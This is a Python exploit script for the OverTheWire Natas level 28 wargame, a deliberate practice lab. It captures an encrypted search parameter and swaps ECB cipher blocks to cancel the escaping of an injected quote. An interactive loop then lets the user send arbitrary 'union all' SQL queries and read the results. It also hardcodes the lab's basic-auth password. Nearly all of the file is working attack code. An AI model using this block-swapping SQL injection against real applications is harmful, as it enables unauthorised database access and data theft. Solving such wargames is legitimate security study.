import requests
import base64
from urllib.parse import unquote, quote
import binascii
import re

# === CONFIGURATION ===
URL = "http://natas28.natas.labs.overthewire.org"
USERNAME = "natas28"
PASSWORD = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"
HEADERS = {
    "Authorization": "Basic " + base64.b64encode(f"{USERNAME}:{PASSWORD}".encode()).decode()
}

# === HELPER FUNCTIONS ===
def get_encrypted_param(query):
    data = {'query': query}
    response = requests.post(URL, data=data, headers=HEADERS, allow_redirects=False)
    location = response.headers.get('Location')
    if not location:
        print("[!] No redirect location found!")
        return None
    encoded_param = location.split('=')[1]
    return encoded_param

def decode_to_blocks(encoded_param):
    decoded = base64.b64decode(unquote(encoded_param))
    hex_data = binascii.hexlify(decoded).decode()
    blocks = [hex_data[i:i+32] for i in range(0, len(hex_data), 32)]
    return blocks

def reencode_blocks(blocks):
    joined_hex = ''.join(blocks)
    raw_bytes = binascii.unhexlify(joined_hex)
    return quote(base64.b64encode(raw_bytes))

def extract_results(html_response):
    return re.findall(r'<li>(.*?)</li>', html_response)

# === MAIN LOGIC ===
def main():
    # Step 1: Get baseline encrypted blocks to reuse the third block
    baseline_param = get_encrypted_param("111222333")
    if not baseline_param:
        return
    baseline_blocks = decode_to_blocks(baseline_param)
    fake_block = baseline_blocks[2]

    print("[+] Ready for input. Type 'exit' to quit.\n")

    while True:
        user_input = input("Enter SQL query (without 'union all'): ").strip()
        if user_input.lower() == 'exit':
            break

        # Construct the payload and get the encrypted response
        payload = f"111222333' union all {user_input};#"
        encrypted_param = get_encrypted_param(payload)
        if not encrypted_param:
            continue

        blocks = decode_to_blocks(encrypted_param)
        if len(blocks) < 3:
            print("[!] Not enough blocks in response.")
            continue

        blocks[2] = fake_block  # Insert fake block to avoid hash mismatch
        final_encoded_param = reencode_blocks(blocks)

        # Send GET request with manipulated param
        response = requests.get(f"{URL}/search.php/?query={final_encoded_param}", headers=HEADERS)
        results = extract_results(response.text)

        if results:
            print("[+] Query Results:")
            for r in results:
                print("  -", r)
        else:
            print("[-] No results or error.")

if __name__ == "__main__":
    main()
